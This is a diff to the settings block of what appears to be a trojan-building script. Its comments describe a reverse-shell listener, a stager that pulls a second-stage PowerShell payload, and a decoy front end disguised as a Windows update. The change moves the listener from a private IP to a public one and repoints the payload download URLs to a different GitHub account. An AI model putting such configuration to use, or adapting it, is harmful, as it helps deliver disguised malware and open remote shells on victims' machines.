@@ -50,14 +50,14 @@ except ImportError:
 # VARIABLES — EDIT THESE BEFORE RUNNING THE SCRIPT
 # ==============================================================================
 # IP and port on which the listener is listening
-LHOST        = "192.168.1.139"
+LHOST        = "151.67.18.144"
 LPORT        = "21"
 
 # Host from which stager (STAGERNAME) download second stage (SECONDNAME)
-ATTACKER_URL = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
+ATTACKER_URL = "https://raw.githubusercontent.com/dok72/dok72.github.io/main/soloemapuoaccedere"
 
 # Host from which trojan download stager (STAGERNAME) and front end file (e.g. windows update - TROJAN-FE)
-TROJAN_URL   = "https://raw.githubusercontent.com/dokDork/dokDork.github.io/main/soloemapuoaccedere"
+TROJAN_URL   = "https://raw.githubusercontent.com/dok72/dok72.github.io/main/soloemapuoaccedere"
 
 # File name
 SECONDNAME   = "second.txt"              # second stage (PS1)
